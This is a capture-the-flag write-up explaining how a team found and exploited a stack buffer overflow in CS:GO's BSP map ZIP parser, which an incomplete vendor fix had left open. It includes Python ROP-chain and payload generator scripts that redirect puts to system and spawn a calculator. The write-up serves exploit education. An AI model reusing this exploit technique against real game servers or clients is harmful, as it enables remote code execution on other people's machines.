# P90 Rush B - PWN - Real World CTF Qualifiers 2018

## About

This was a challenge from Real World CTF Qualifiers - 2018, in which we participated as `perfect blue`

This challenge was solved by [@j0nathanj](https://twitter.com/j0nathanj) and [@VoidMercy_pb](https://twitter.com/VoidMercy_pb).

Unfortunately we did not manage to solve this challenge by the time the CTF ended, but we kept working on it the next 2 days and managed to successfully exploit it! :)

Our solution to this challenge involves a 0-day, which was also found a few days earlier by the great [@_niklasb](https://twitter.com/_niklasb) from Eat Sleep Pwn Repeat, and was fixed in the latest update. 

We decided to make this write-up as detailed as we can, to show our whole process, from finding the bug, exploiting it, and the problems that we have faced.

## The Challenge

The challenge description / readme file suggests that we have to somehow exploit the way CS:GO handles it's maps to achieve code execution.

## Recon

After reading the readme and the challenge description, we immediately thought of a pretty recent CS:GO vulnerability that was [reported to HackerOne](https://hackerone.com/reports/351014).

This vulnerability was quite a shortcut for this challenge. It was the exact same type of bug we needed - a bug in the BSP (maps) parser!

Unfortunately for us, this bug was fixed already (or was it ..?) by Valve after the original report. We decided to use this bug as our base, and search for vulnerabilities somewhere close to where the fixed one was.

An important point for this challenge was knowing what structs/classes we are dealing with. We used [this](https://developer.valvesoftware.com/wiki/Source_BSP_File_Format) page and parts of the [leaked Source Engine](https://github.com/VSES/SourceEngine2007) source code from 2007 to figure out the structs.

The structs that are relevant to this exploit are `Zip_FileHeader` and `ZIP_EndOfCentralDirRecord`. The `structs.c` file is attached with their full definitions.

These are the structs with the members that were important for the exploit:

```C
struct ZIP_FileHeader
{
	
	unsigned int	signature; //  4 bytes PK12 
	...
	...
	unsigned short	fileNameLength; // file name length 2 bytes 
	...
	...
	// The filename comes right after! (variable size) 
};
```

```C

struct ZIP_EndOfCentralDirRecord
{
	
	unsigned int	signature; // 4 bytes PK56
	...
	...
	unsigned short	nCentralDirectoryEntries_Total;	// 2 bytes - A.K.A numFilesInZip
	...
	...
	
};
```

## The "fixed" bug

As reported by the finder, the old bug was in the function `CZipPackFile::Prepare`. 

![](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/RealWorldCTF-2018/pwn/P90_Rush_B/images/Old_Bug.jpg)

(Credit for this picture goes to the original bug-finder)

In the picture above, the function `Get()` calls `memcpy()` and copies the filename (which is embedded in the map file itself) to the variable `tmpString`.

There were no boundary checks, which lead to a classic stack-based buffer overflow, due to the fact that the `zipFileHeader.fileNameLength` and the `filename` are embedded in the BSP file itself.

We tried to run the PoC map that was provided by the bug finder, and it crashed due to an Assert. 

## Finding the new bug - "Source Code" review

After reading the leaked source code of Source Engine from 2007, we understood that each BSP has some ZIP files inside, holding the filenames and the filename lengths.

There is also another `EndOfCentralDirectory` ZIP file which indicates that we have reached the end of the BSP file (will be used later).

A normal ZIP file has the signature `PK12` and an `EndOfCentralDirectory` ZIP has the signature `PK56`.

Because the original bug was said to be fixed by Valve, we wrongly assumed that the patch was just a boundary check for that same `Get()` call, and we relied on the leaked source **FROM 2007** - both of us weren't using our usual set-up and we did not have IDA/other decompiler with us, so we decided to use the leaked source code.

After reading the source a bit, we noticed another call to the `Get()` function, with yet another filename! 

This seemingly buggy code was also in the same function as the previous one, `CZipPackFile::Prepare`.

```CPP
bool CZipPackFile::Prepare( int64 fileLen, int64 nFileOfs )
{
...
...
1201		ZIP_FileHeader zipFileHeader;
1202 		char filename[MAX_PATH];
1203		// Check for a preload section, expected to be the first file in the zip
1204		zipDirBuff.GetObjects( &zipFileHeader );
1205		zipDirBuff.Get( filename, zipFileHeader.fileNameLength );
1206		filename[zipFileHeader.fileNameLength] = '\0';
...
...
}
```

As seen in the comment (also present in the actual leak), the `Get()` this time copies the "first file" in the ZIP.

We tried to corrupt the first filename in the ZIP, and we tried to also corrupt the size, but nothing worked out and we ended up wasting quite some time on it.
 
## Finding the bug - Reverse Engineering

Once we had with access to our IDAs, we decided to try and reverse engineer the function that was supposedly patched by Valve as a fix for the report.

We decided to debug the PoC that crashed due to an assertion, just to find out in what module the buggy code was, and we found out it was in `dedicated.so`.

In order to spot the "old" vulnerable function in IDA, we opened up `dedicated.so`, and searched for strings that were present in the leaked source code as warnings in that same function.

![](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/RealWorldCTF-2018/pwn/P90_Rush_B/images/Strings_From_SRC.png)

After reversing the new "patched" function, we noticed a lot similarities to the leaked source. However, when we got to the piece of code that we __thought__ was vulnerable (the `Get()` call that we found), we noticed some boundary checks for the `zipFileHeader.fileNameLength`: 

![](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/RealWorldCTF-2018/pwn/P90_Rush_B/images/bug_fix.png)

At this point we knew that what we thought was a bug was actually fixed already. So, we kept reversing, and got to the piece of code which was reported as buggy.

![](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/RealWorldCTF-2018/pwn/P90_Rush_B/images/vuln.png) 

Thanks to our variable-renaming, we immediately noticed something was off.

As seen in the first code snippet (referred to as - "the fix") the `max_fileNameLength` is updated to be `fileNameLength` (extracted from the BSP) only if the `fileNameLength <= 258` or in other words, if `fileNameLength < max_fileNameLength`.

In the first `Get()` call, the fix prevents the overflow. However, if you look closely, the 2nd call to `Get()` always uses `fileNameLength` as the length -- even if `fileNameLength > max_fileNameLength`!

The variable `tmpString` is **260 bytes** long, so if we can get the second `Get()` call to `memcpy()` more than 260 bytes - then we can trigger the stack-based buffer overflow!

## Bypassing all the checks

So, now that we have found the vulnerability, we have to trigger it to confirm it's actually there!

We spent quite some time trying to trigger the vulnerability -- we changed the `fileNameLength` of the second ZIP file (we identified it's location using the header `PK12`) in the BSP to something larger, and also made the `fileName` bigger, but we noticed a few inconsistencies.

We noticed that after a certain size, the function fails in the beginning, where it does some checks on the validity of the BSP.

In the beginning of `Prepare()`, the following functionality exists:

```CPP
bool CZipPackFile::Prepare( int64 fileLen, int64 nFileOfs )
{
...
...
...
	// Find and read the central header directory from its expected position at end of the file
	bool bCentralDirRecord = false;
	int64 offset = fileLen - sizeof( ZIP_EndOfCentralDirRecord );

	// scan entire file from expected location for central dir
	for ( ; offset >= 0; offset-- )
	{
		ReadFromPack( -1, (void*)&rec, -1, sizeof( rec ), offset );
		m_swap.SwapFieldsToTargetEndian( &rec );
		if ( rec.signature == PKID( 5, 6 ) )
		{
			bCentralDirRecord = true;
			break;
		}
	}


	Assert( bCentralDirRecord );
	if ( !bCentralDirRecord )
	{
		// no zip directory, bad zip
		return false;
	}

```

Looks confusing? It really isn't!

Basically what happens here is that the function starts iterating from `fileLen - sizeof(ZIP_EndOfCentralDirOrder)` and back to the beginning of the file, searching for 4 bytes that match the header of `ZIP_EndOfCentralDirOrder` (in other words- the value `PK56`).

After a little bit of debugging, we noticed that no matter how much we enlarge the file, `fileLen` always stays the same! This can only mean that it is somehow saved statically!

To verify our theory, we searched for the file's length in HxD, we actually found it! :)

In order to bypass the loop seen above, we have to make `fileLen` a bigger value, because the `ZIP_EndOfCentralDirOrder` is the last struct in the file, and if `fileLen` is too small, iterating from `fileLen - sizeof(ZIP_EndOf_CentralDirRecord)` would iterate starting before the `PK56` header, all the way back to the beginning of the file- and we won't be able to bypass that check!

So to bypass that, we just enlarged the `fileLen` and padded the end of the file with zeros, this way we can always guarantee that we bypass this check!

(We could just fake the `PK56` header, but we wanted to know the root-cause of this validation-fail)

## Triggering the vulnerability - 0x41414141 in ?? ()

Now that we are past the `PK56` header validations, we can try overflowing `tmpString` with a large string!

At first, we tried to just add a lot of `A`s and hope for EIP control, but then we noticed that there is a lot of metadata on the stack that is still being used in the function... we thought a little bit and we noticed that the only access to the data stored on the stack is looks like the following (this is an actual example from the binary):

![](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/RealWorldCTF-2018/pwn/P90_Rush_B/images/asm_example.png)

(Notice, the access to a stack-address is sometimes also used in the destination of the instruction)

So we decided to overwrite everything but the return-address with zeroes, this way we don't crash due to writing/reading from an invalid address!

It turns out that even overflowing with the zeroes was not enough, and we still crashed :( ...

This time, we noticed that after the `Get()` function is overflowing, even if we overwrite data with zeroes, we will crash because this functionality is inside a loop that iterates through all the files in a ZIP folder.

Remember the structs we pointed out as necessary? It turns out that `ZIP_EndOfCentralDirRecord.nCentralDirectoryEntries_Total` holds the number of files inside a zip!
This can be easily understood from the leaked source as well:

```CPP
...
int numFilesInZip = rec.nCentralDirectoryEntries_Total;

for ( int i = firstFileIdx; i < numFilesInZip; ++i )
{
	...
	// The Get() call is inside this loop.
	...
}
```

Changing the `ZIP_EndOfCentralDirRecord.nCentralDirectoryEntries_Total` to 2, and getting the 2nd ZIP to achieve an overflow will result in an overflow, and an instant loop exit which leads to the end of the function, or in other words: we can control EIP!


## Building a ROP chain

The main binary (`srcds`) is a 32 bit application, which is compiled without PIE nor stack-cookies, and does not have Full Relro enabled.

Using this knowledge, we built a ROP chain that achieves an arbitrary add primitive, and adds the offset of `system()` to `puts` GOT entry, and then invokes `puts("/usr/bin/gnome-calculator")` to finally pop a calc :D

The following code generates a ROP-chain payload that we can insert in the offset of the return address in order to invoke `system("/usr/bin/gnome-calculator")`:
```Python
from pwn import *

add_what_where = 0x080488fe 	# add dword ptr [eax + 0x5b], ebx ; pop ebp ; ret
pop_eax_ebx_ebp = 0x080488ff 	# pop eax ; pop ebx ; pop ebp ; ret

putsgot = 0x8049CF8
putsoffset = 0x5fca0
systemoffset = 0x3ada0
putsplt = 0x080485E0

bss = 0x8049d68

command = "/usr/bin/gnome-calculator"

rop = []

for i in range(0, len(command), 4):
	current = int(command[i:][:4][::-1].encode("hex"), 16)
	rop += [pop_eax_ebx_ebp, bss + i - 0x5b, current, bss, add_what_where, bss]

rop += [pop_eax_ebx_ebp, putsgot - 0x5b, 0x100000000 - (putsoffset - systemoffset), bss, add_what_where, bss]
rop += [putsplt, bss, bss, bss]

payload = ""
for i in rop:
	payload += p32(i)


with open('rop', 'wb') as f:
	f.write(payload)

print '[+] Generated ROP.\n'
```

## Finalizing the exploit

To finish up the exploit, we just need to overwrite the whole buffer up until the return address with zeroes, and then insert our ROP payload!

```Python

from pwn import *

rop = ''

with open('rop', 'r') as f:
	rop = f.read()

payload  = p8(0) * 0x1c0 
payload += rop

with open('payload', 'w') as f:
	f.write(payload)

print '[+] Full payload generated.\n'
``` 

After inserting our crafted payload, fixing the `fileLen`, and `fileNameLength` we can finally execute our code!

![](https://github.com/j0nathanj/CTF-WriteUps/blob/master/2018/RealWorldCTF-2018/pwn/P90_Rush_B/images/csgo_calc.gif)

## Conclusions and lessons learned

- We learned a few lessons from this challenge, and we feel like the main one is to not rely on old source code / leaks. We could have saved a lot of time by just opening the binary up in IDA, yet we did not do it immediately which we feel now like we should have.

- Some of you might have noticed, but to those of you who did not: Valve's first "fix" did not actually fix the vulnerability that was reported! It did fix the first occurrence of the `Get()` call, but not the second one - which was actually the one that was reported!

This gets us to another important lesson learned - which is to never trust a "fix". Always verify it actually fixes the bug!


We had a lot of fun exploiting this challenge, and actually finding a 0day in a CTF challenge! 

Looking forward to Real World CTF Finals - 2018!

